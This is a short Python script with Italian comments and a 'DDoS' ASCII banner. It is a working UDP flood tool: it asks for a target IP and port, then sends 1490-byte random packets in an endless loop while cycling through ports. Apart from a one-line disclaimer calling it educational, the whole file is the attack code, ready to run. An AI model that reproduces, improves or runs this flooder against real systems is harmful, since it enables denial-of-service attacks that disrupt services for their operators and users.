#Questo script è fatto solo a scopo educativo, non rispondo di nessun danno causato da esso.

import os
import time
import socket
import random


PacketSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byteDaInviare = random._urandom(1490)


banner = """
8888888b.  8888888b.            .d8888b.  
888  "Y88b 888  "Y88b          d88P  Y88b 
888    888 888    888          Y88b.      
888    888 888    888  .d88b.   "Y888b.   
888    888 888    888 d88""88b     "Y88b. 
888    888 888    888 888  888       "888 
888  .d88P 888  .d88P Y88..88P Y88b  d88P 
8888888P"  8888888P"   "Y88P"   "Y8888P"  
                                          
"""
print(banner)


ip = input("IP del Target : ")
Porta = int(input("Porta: "))

os.system("cls" if os.name == "nt" else "clear")

time.sleep(1)
PacchettiInviati = 0

while True:
    try:
        PacketSocket.sendto(byteDaInviare, (ip, Porta))
        PacchettiInviati = PacchettiInviati + 1
        Porta = Porta + 1
        print("Invitati %s pacchetti all'indirizzo ip : %s" % (PacchettiInviati, ip))
        if Porta == 65534:
            Porta = 1
    except socket.error as e:
        print("C'è stata una eccezione : ", e)
